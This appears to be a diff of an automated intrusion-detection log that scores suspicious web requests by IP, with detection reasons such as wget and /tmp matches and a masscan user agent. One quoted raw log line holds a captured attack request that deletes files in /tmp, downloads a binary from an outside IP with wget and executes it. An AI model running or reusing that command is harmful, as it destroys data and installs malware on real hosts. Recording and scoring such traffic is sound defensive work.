@@ -3,3 +3,8 @@
 IP: 190.52.110.166 | Level: CRITICAL 🚨 | Score: 205
   Reason: QueryMatch(wget):+80, QueryMatch(/tmp):+60, UAExactMatch:+50, SuspiciousStatus(400):+15
   RawLog: 190.52.110.166 - - [28/May/2026:00:03:26 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+ 203.145.34.131/jaws;chmod+777+jaws;sh+jaws;./jaws; HTTP/1.1" 400 157 "-" "-" "-"
+
+--- Update 2026-05-28T00:20:45.599114 ---
+IP: 187.17.224.139 | Level: CRITICAL 🚨 | Score: 115
+  Reason: UAMatch(masscan):+100, SuspiciousStatus(400):+15
+  RawLog: 187.17.224.139 - - [28/May/2026:00:16:02 +0000] "GET / HTTP/1.0" 400 255 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/" "-"
